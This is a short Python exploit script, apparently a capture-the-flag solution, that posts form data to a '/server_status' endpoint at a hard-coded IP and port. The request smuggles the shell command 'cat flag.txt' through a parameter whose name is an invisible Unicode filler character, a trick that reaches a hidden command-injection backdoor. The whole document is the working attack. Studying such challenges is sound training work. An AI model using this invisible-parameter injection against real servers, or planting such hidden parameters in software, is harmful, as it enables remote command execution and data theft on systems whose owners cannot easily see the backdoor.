import requests

target = "http://94.237.57.211:46217/server_status"

def main():
    res = requests.post(
        target, 
        headers={
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data={
            "choice": 6,
            "ㅤ": "cat flag.txt"
        }
    )
    
    print(res.text)


if __name__ == "__main__":
    main()
